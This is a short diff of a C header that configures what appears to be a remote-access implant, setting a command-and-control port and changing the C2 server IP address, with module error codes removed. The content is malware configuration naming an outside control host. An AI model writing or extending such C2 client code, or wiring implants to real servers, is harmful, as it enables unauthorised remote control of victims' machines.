@@ -1,10 +1,6 @@
 /* --- C2 connection properties --- */
 #define C2PORT 8080
-#define C2SERVER "3.15.16.149"
-
-/* error codes for executing modules */
-#define MODULE_NOTFOUND "2"
-#define MODULE_ERROR "1"
+#define C2SERVER "18.191.17.162"
 
 /* module codes for referencing when receiving a command */
 #define DISCONNECT 0
